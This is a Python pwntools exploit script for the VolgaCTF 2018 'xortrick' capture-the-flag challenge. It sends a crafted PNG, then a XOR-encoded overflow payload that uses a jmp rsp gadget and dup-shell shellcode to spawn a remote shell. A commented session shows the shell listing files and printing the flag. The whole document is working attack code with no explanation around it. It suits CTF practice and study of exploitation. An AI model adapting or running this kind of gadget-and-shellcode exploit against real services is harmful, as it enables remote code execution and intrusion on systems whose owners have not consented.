#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from io import BytesIO
from itertools import cycle

from PIL import Image
from pwn import *

context(arch='amd64', os='linux')

if args['REMOTE']:
    io = remote('xortrick.quals.2018.volgactf.ru', 45678)
else:
    io = remote('127.0.0.1', 45678)

io.recvuntil('Send your image file and stego message.')

# create image
width, height = 0x80, 0x1
image = Image.new('RGB', (width, height))
output = BytesIO()
image.save(output, 'png')
image_bytes = output.getvalue()

# send it
io.send(p64(len(image_bytes)))
sleep(0.5)
io.send(image_bytes)

# create data
JMP_RSP_ADDR = 0x0075a53b  # jmp rsp; ret (gadget from /usr/bin/python3.5, which is not a PIE)
shellcode = asm('mov rbp, 0x4') + asm(shellcraft.amd64.linux.dupsh())
data = fit({cyclic_find('kaae'): p64(JMP_RSP_ADDR) + shellcode}, length=0x300)

# xor data with the key used in xtproc.so
xor_key = unhex('c5145c1e4210842ac5145c1e4210842a')[::-1]
data = ''.join([chr(ord(c) ^ ord(k)) for c, k in zip(data, cycle(xor_key))])

# send it
io.send(p64(len(data)))
sleep(0.5)
io.send(data)

io.interactive()

# $ ./xortrick.py REMOTE
# [+] Opening connection to xortrick.quals.2018.volgactf.ru on port 45678: Done
# [*] Switching to interactive mode
# sh: turning off NDELAY mode
# $ ls
# flag.txt
# service.py
# xtproc.so
# $ cat flag.txt
# VolgaCTF{M@ke_pyth0n_explo1table_ag@in}
